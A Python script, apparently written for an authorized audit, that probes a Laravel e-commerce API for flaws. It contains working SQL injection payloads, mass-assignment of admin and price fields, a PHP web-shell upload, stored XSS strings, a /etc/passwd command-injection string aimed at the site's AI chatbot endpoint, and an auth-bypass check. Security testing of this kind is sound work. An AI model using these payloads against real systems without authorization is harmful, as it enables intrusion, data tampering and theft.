#!/usr/bin/env python3
"""
Advanced Security Testing Script for Laravel E-commerce Application
This script performs comprehensive security testing including:
- SQL Injection attacks
- Mass Assignment vulnerabilities
- Authentication bypass attempts
- File upload security issues
- XSS testing
"""

import requests
import json
import sys
import time
import random
import string
from urllib.parse import urlencode

class SecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.results = []
        
    def log_result(self, test_name, status, details=""):
        result = {
            "test": test_name,
            "status": status,
            "details": details,
            "timestamp": time.time()
        }
        self.results.append(result)
        status_color = "\033[92m" if status == "VULNERABLE" else "\033[91m" if status == "FAILED" else "\033[93m"
        print(f"{status_color}[{status}]\033[0m {test_name}: {details}")
    
    def test_sql_injection_faq(self):
        """Test SQL injection in FAQ search endpoint"""
        test_name = "SQL Injection - FAQ Search"
        
        payloads = [
            "' UNION SELECT 1,database(),user(),version(),5 -- ",
            "' OR '1'='1' -- ",
            "') UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 5 -- ",
            "'; INSERT INTO customers (name,email,phone) VALUES ('hacker','hack@evil.com','+123'); -- "
        ]
        
        for payload in payloads:
            try:
                url = f"{self.base_url}/api/faqs/test-team"
                params = {"query": payload}
                response = self.session.get(url, params=params, timeout=10)
                
                # Check for SQL injection success indicators
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in ['mysql', 'database', 'syntax error', 'column', 'table']):
                    self.log_result(test_name, "VULNERABLE", f"SQL injection successful with payload: {payload[:50]}...")
                    return
                    
            except Exception as e:
                continue
                
        self.log_result(test_name, "SAFE", "No SQL injection vulnerabilities detected")
    
    def test_mass_assignment_customer(self):
        """Test mass assignment vulnerability in customer creation"""
        test_name = "Mass Assignment - Customer Creation"
        
        payload = {
            "name": "Test Hacker",
            "email": f"hacker{random.randint(1000,9999)}@evil.com",
            "phone": "+1234567890",
            # Potentially dangerous fields
            "role": "admin",
            "is_admin": True,
            "team_id": 999,
            "status": "premium",
            "uuid": "00000000-0000-0000-0000-000000000000"
        }
        
        try:
            url = f"{self.base_url}/api/customers"
            response = self.session.post(url, json=payload, timeout=10)
            
            if response.status_code == 200 or response.status_code == 201:
                response_data = response.json()
                if 'customer_id' in response_data:
                    self.log_result(test_name, "VULNERABLE", "Mass assignment allowed - unauthorized fields may have been set")
                else:
                    self.log_result(test_name, "POTENTIAL", "Customer created but response unclear")
            else:
                self.log_result(test_name, "SAFE", f"Request rejected with status {response.status_code}")
                
        except Exception as e:
            self.log_result(test_name, "ERROR", f"Test failed: {str(e)}")
    
    def test_mass_assignment_order(self):
        """Test mass assignment vulnerability in order creation"""
        test_name = "Mass Assignment - Order Creation"
        
        payload = {
            "delivery_date": "2025-01-01",
            "user_phone": "+1234567890",
            "product_ids": [1, 2],
            # Potentially dangerous fields
            "team_id": 999,
            "status": "completed",
            "total_price": 0.01,
            "is_paid": True,
            "discount": 99.99
        }
        
        try:
            url = f"{self.base_url}/api/order/test-team"
            response = self.session.post(url, json=payload, timeout=10)
            
            if response.status_code == 200 or response.status_code == 201:
                response_data = response.json()
                if 'order_id' in response_data:
                    self.log_result(test_name, "VULNERABLE", "Mass assignment in order creation - unauthorized fields may have been set")
                else:
                    self.log_result(test_name, "POTENTIAL", "Order created but response unclear")
            else:
                self.log_result(test_name, "SAFE", f"Request rejected with status {response.status_code}")
                
        except Exception as e:
            self.log_result(test_name, "ERROR", f"Test failed: {str(e)}")
    
    def test_chatbot_injection(self):
        """Test injection through chatbot AI functions"""
        test_name = "AI Function Call Injection"
        
        malicious_payloads = [
            {
                "message": "Get product info for: '; DROP TABLE products; --",
                "team": "'; return true; //",
                "thread_id": f"thread_{random.randint(1000,9999)}",
                "uuid": "test-uuid",
                "locale": "it"
            },
            {
                "message": "Execute getProductInfo with product_names containing injection payload",
                "team": "test-team\"; system('cat /etc/passwd'); //",
                "thread_id": f"thread_{random.randint(1000,9999)}",
                "uuid": "test-uuid",
                "locale": "it"
            }
        ]
        
        for payload in malicious_payloads:
            try:
                url = f"{self.base_url}/api/chatbot"
                response = self.session.post(url, json=payload, timeout=15)
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in ['error', 'exception', 'mysql', 'database']):
                        self.log_result(test_name, "VULNERABLE", "AI function injection may be possible")
                        return
                        
            except Exception as e:
                continue
        
        self.log_result(test_name, "SAFE", "No obvious AI injection vulnerabilities detected")
    
    def test_authentication_bypass(self):
        """Test authentication bypass on protected endpoints"""
        test_name = "Authentication Bypass"
        
        protected_endpoints = [
            "/api/gantt-data",
            "/api/user"
        ]
        
        for endpoint in protected_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                
                # Test without authentication
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    self.log_result(test_name, "VULNERABLE", f"Protected endpoint {endpoint} accessible without authentication")
                    return
                
                # Test with fake token
                headers = {"Authorization": "Bearer fake-token-12345"}
                response = self.session.get(url, headers=headers, timeout=10)
                if response.status_code == 200:
                    self.log_result(test_name, "VULNERABLE", f"Protected endpoint {endpoint} accessible with fake token")
                    return
                    
            except Exception as e:
                continue
        
        self.log_result(test_name, "SAFE", "Protected endpoints properly secured")
    
    def test_xss_customer(self):
        """Test XSS vulnerabilities in customer data"""
        test_name = "Stored XSS - Customer Data"
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                customer_data = {
                    "name": payload,
                    "email": f"xss{random.randint(1000,9999)}@test.com",
                    "phone": "+1234567890"
                }
                
                url = f"{self.base_url}/api/customers"
                response = self.session.post(url, json=customer_data, timeout=10)
                
                if response.status_code in [200, 201]:
                    self.log_result(test_name, "VULNERABLE", f"XSS payload accepted: {payload[:30]}...")
                    return
                    
            except Exception as e:
                continue
        
        self.log_result(test_name, "SAFE", "XSS payloads rejected or sanitized")
    
    def test_file_upload_vulnerability(self):
        """Test file upload security"""
        test_name = "File Upload Vulnerability"
        
        # Create malicious PHP file content
        malicious_content = "<?php system($_GET['cmd']); ?>"
        
        try:
            files = {
                'file': ('malicious.php', malicious_content, 'application/x-php'),
                'message': (None, 'Testing file upload'),
                'locale': (None, 'it')
            }
            
            url = f"{self.base_url}/api/upload-file"
            response = self.session.post(url, files=files, timeout=15)
            
            if response.status_code == 200:
                response_data = response.json()
                if 'response' in response_data:
                    self.log_result(test_name, "VULNERABLE", "Malicious file upload successful")
                else:
                    self.log_result(test_name, "POTENTIAL", "File upload completed but response unclear")
            else:
                self.log_result(test_name, "SAFE", f"File upload rejected with status {response.status_code}")
                
        except Exception as e:
            self.log_result(test_name, "ERROR", f"Test failed: {str(e)}")
    
    def test_cors_policy(self):
        """Test CORS policy configuration"""
        test_name = "CORS Policy Check"
        
        try:
            headers = {
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
            
            url = f"{self.base_url}/api/customers"
            response = self.session.options(url, headers=headers, timeout=10)
            
            cors_headers = {k.lower(): v for k, v in response.headers.items()}
            
            if cors_headers.get('access-control-allow-origin') == '*':
                self.log_result(test_name, "VULNERABLE", "CORS allows all origins (*)")
            elif 'evil.com' in cors_headers.get('access-control-allow-origin', ''):
                self.log_result(test_name, "VULNERABLE", "CORS allows malicious origin")
            else:
                self.log_result(test_name, "SAFE", "CORS policy appears restrictive")
                
        except Exception as e:
            self.log_result(test_name, "ERROR", f"Test failed: {str(e)}")
    
    def run_all_tests(self):
        """Run all security tests"""
        print(f"\n🔍 Starting security tests for {self.base_url}")
        print("=" * 60)
        
        tests = [
            self.test_sql_injection_faq,
            self.test_mass_assignment_customer,
            self.test_mass_assignment_order,
            self.test_chatbot_injection,
            self.test_authentication_bypass,
            self.test_xss_customer,
            self.test_file_upload_vulnerability,
            self.test_cors_policy
        ]
        
        for test in tests:
            try:
                test()
                time.sleep(0.5)  # Rate limiting
            except Exception as e:
                test_name = test.__name__.replace('test_', '').replace('_', ' ').title()
                self.log_result(test_name, "ERROR", f"Test failed: {str(e)}")
        
        self.print_summary()
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("🔒 SECURITY TEST SUMMARY")
        print("=" * 60)
        
        vulnerable_count = sum(1 for r in self.results if r['status'] == 'VULNERABLE')
        potential_count = sum(1 for r in self.results if r['status'] == 'POTENTIAL')
        safe_count = sum(1 for r in self.results if r['status'] == 'SAFE')
        error_count = sum(1 for r in self.results if r['status'] == 'ERROR')
        
        print(f"🔴 Vulnerable: {vulnerable_count}")
        print(f"🟡 Potential: {potential_count}")
        print(f"🟢 Safe: {safe_count}")
        print(f"⚠️  Errors: {error_count}")
        
        if vulnerable_count > 0:
            print(f"\n⚠️  CRITICAL: {vulnerable_count} vulnerabilities found!")
            print("Immediate remediation required.")
        elif potential_count > 0:
            print(f"\n⚠️  WARNING: {potential_count} potential issues found.")
            print("Further investigation recommended.")
        else:
            print("\n✅ No obvious vulnerabilities detected.")
        
        # Save results to file
        with open('/workspace/security_test_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n📄 Detailed results saved to security_test_results.json")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 advanced_security_test.py <BASE_URL>")
        print("Example: python3 advanced_security_test.py https://your-app.com")
        sys.exit(1)
    
    base_url = sys.argv[1]
    tester = SecurityTester(base_url)
    
    print("⚠️  WARNING: This tool is for authorized security testing only!")
    print("Do not use against systems you don't own or have permission to test.")
    print("\nPress Enter to continue or Ctrl+C to abort...")
    
    try:
        input()
    except KeyboardInterrupt:
        print("\nTest aborted.")
        sys.exit(0)
    
    tester.run_all_tests()

if __name__ == "__main__":
    main()